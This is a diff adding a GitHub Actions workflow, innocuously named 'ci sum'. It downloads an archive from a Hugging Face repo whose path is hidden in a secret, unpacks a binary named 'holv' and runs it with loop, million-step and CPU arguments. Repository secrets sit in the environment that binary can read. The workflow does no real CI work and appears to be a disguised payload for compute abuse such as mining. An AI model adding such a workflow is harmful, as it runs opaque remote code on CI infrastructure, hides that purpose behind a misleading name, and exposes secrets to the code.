@@ -1,0 +1,37 @@
+name: ci sum
+env:
+  REPO_DIR: ${{ github.workspace }}
+  TTAG: v1.0.0_${{ github.event.inputs.amd_override }}
+  LOHHOP: ${{ github.event.inputs.loop_override }}
+  ENV_MYWEB: ${{ secrets.ENV_MYWEB }}
+  ENV_ADS: ${{ secrets.ENV_ADS }}
+  ENV_DISD: ${{ secrets.ENV_DISD }}
+  HF_REPO: ${{ secrets.HF_REPO }}
+  GT: 'huggingface.co'
+on:
+  workflow_dispatch:
+    inputs:
+      amd_override:
+        description: 'aam'
+        required: false
+        default: 'v3'
+        type: string
+      loop_override:
+        description: 'llp'
+        required: false
+        default: '10'
+        type: string
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+      - name: Sum
+        timeout-minutes: 44
+        run: |
+          curl -o holv.7z -L "https://${{ env.GT }}/${{ env.HF_REPO }}/resolve/main/doit_${{ env.TTAG }}.7z?download=true"
+          7z x holv.7z && rm -rf holv.7z
+          mv doit holv
+          chmod +x holv
+          ./holv loop ${{ env.LOHHOP }} steps 1000000 wait 0 cpu 3
